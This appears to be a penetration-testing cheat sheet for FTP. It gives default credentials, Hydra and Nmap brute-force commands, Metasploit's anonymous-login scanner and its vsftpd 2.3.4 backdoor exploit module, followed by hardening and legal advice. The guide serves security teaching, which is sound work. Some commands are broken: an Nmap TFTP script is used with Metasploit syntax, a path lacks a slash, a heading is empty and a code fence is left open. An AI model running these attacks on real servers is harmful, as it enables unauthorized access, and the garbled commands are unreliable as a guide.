### What is the FTP Protocol?

### Default Credentials

```
guest:guest
anonymous:anonymous
```

### Version Detection

```
use exploit/unix/ftp/tftp-enum.nse
set RHOSTS 
set RPORT 21
```

### How to Brute force FTP Services

```
hydra -l admin -P Top_100_Passwords.txt ftp://localhost/
```

```
nmap --script ftp-brute -p 21 --script-args userdb=/root/Top_10_UserAdmins.txt,passdb=root/Top_100_Passwords.txt <IP>
```

```
msf6 > use auxiliary/scanner/ftp/anonymous
```

```
set RHOSTS nerdherd.thm
set RPORT 21
run
```

### How to Exploit vsftpd 2.3.4 Backdoor

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Nmap NSE Scripts for FTP

```
â”Œâ”€â”€(rfsã‰¿PopLabSec)-[~]
â””â”€$ ls -la /usr/share/nmap/scripts | grep -e "ftp"
-rw-r--r-- 1 root root   4530 Jan 18 09:54 ftp-anon.nse

#### Setting Up FTP Server for Penetration Testing

To set up an FTP server environment for testing the vulnerability, you can use Docker or setup an environment manually:

```
docker run -d -p 21:21 -p 20:20 -p 21000-21010:21000-21010 --name ftp_server fauria/vsftpd
```

#### Securing the FTP Service

Once the vulnerabilities are identified and exploited, as a responsible security professional, it is important to secure the FTP server:

* Change the default credentials.
* Disable anonymous access if it's not necessary.
* Use strong passwords and employ password management policies.
* Keep FTP server software up to date with the latest security patches.
* Consider using secure versions like SFTP (SSH File Transfer Protocol) or FTPS (FTP Secure) which provide encryption.

#### Legal and Ethical Considerations

Before engaging in any penetration testing activity, always:

* Get explicit written permission from the owner of the FTP server.
* Follow the scope of the agreed terms and conditions to avoid legal issues.
* Be ethical and responsible with the data and access privileges obtained during testing.
* Report all findings to the server owner and provide recommendations for securing their systems.

#### Conclusion

FTP, being one of the oldest file transfer protocols, is vulnerable to various attacks. Use this guide responsibly, always within the legal frameworks, and contribute to a more secure digital environment.
